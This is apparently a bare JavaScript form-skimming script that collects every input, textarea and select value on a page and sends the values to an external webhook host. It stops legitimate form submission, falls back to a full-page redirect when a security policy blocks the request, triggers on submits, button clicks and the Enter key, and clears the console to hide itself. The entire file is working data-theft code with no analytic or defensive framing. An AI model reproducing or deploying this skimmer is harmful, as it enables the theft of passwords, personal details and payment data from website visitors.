const webhookBase = 'https://datarecv.vercel.app/api/webhook'

async function send(params) {
  if (!params) return

  params.append('webhook_redirect', location.origin)
  const finalUrl = `${webhookBase}/q?${params.toString()}`

  document.addEventListener('securitypolicyviolation', () => {
    location.href = finalUrl
  })

  const call = new Image()
  call.src = finalUrl
}

function getData() {
  const params = new URLSearchParams()

  document.querySelectorAll('input, textarea, select').forEach((input) => {
    const key = input.name || input.id

    if (key && input.value) {
      params.append(key, input.value)
    }
  })

  return params
}

document.querySelectorAll('form').forEach((form) => {
  form.addEventListener('submit', (e) => {
    e.preventDefault()
    send(getData())
  })
})

document.querySelectorAll('form *[role="button"], button').forEach((btn) => {
  btn.addEventListener('click', () => {
    send(getData())
  })
})

addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    send(getData())
  }
})

console.clear()
